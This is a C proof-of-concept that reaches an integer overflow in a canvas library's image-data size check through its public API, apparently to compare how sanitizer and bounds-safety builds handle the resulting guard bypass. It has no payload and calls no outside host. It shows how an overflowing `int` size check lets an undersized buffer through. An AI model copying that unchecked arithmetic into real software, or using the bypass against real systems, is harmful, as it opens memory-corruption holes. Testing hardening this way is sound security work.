// PoC: integer overflow in a canvas size computation, reached through the PUBLIC
// API as an untrusted consumer (compiled WITHOUT -fbounds-safety, so the
// annotations on canvas.h vanish -- exactly how an external caller sees it).
//
// canvas_get_image_data() guards with `len < w * h * 4`, computed in `int`.
// With w = h = 40000, w*h = 1.6e9 (fits int32) but w*h*4 = 6.4e9 overflows a
// signed 32-bit int -- undefined behaviour.  We pass a *small* out buffer and
// observe what each build does:
//
//   debug-cpu   (-fsanitize=integer,undefined)  -> fatal: signed overflow report
//   release-cpu (-Os, library still -fbounds-safety) -> relies on the downstream
//               __counted_by(len) checks; the overflow itself is silent UB.
//
// Usage: ./overflow_poc [w] [h]   (defaults 40000 40000)

#include "canvas.h"

#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>

int main(int argc, char **argv) {
    int w = argc > 1 ? atoi(argv[1]) : 40000;
    int h = argc > 2 ? atoi(argv[2]) : 40000;

    canvas *cv = canvas_create(8, 8);
    if (!cv) {
        printf("canvas_create failed\n");
        return 2;
    }

    int len = 8 * 8 * 4;
    uint8_t *out = calloc((size_t)len, 1);

    long long true_bytes = (long long)w * (long long)h * 4;
    // Reproduce the library's wrapped value WITHOUT tripping UBSan here: do the
    // wrap in unsigned (defined) then reinterpret as int (impl-defined, not UB).
    int as_int32 = (int)((unsigned)w * (unsigned)h * 4u);
    printf("w=%d h=%d : true w*h*4 = %lld, but as int32 = %d  (guard `len < that` is %s)\n",
           w, h, true_bytes, as_int32, (len < as_int32) ? "TRUE -> rejected" : "FALSE -> BYPASSED");
    printf("calling canvas_get_image_data with a %d-byte out buffer...\n", len);
    fflush(stdout);

    canvas_get_image_data(cv, 0, 0, w, h, out, len);

    printf("...returned, no trap or abort\n");
    free(out);
    canvas_destroy(cv);
    return 0;
}
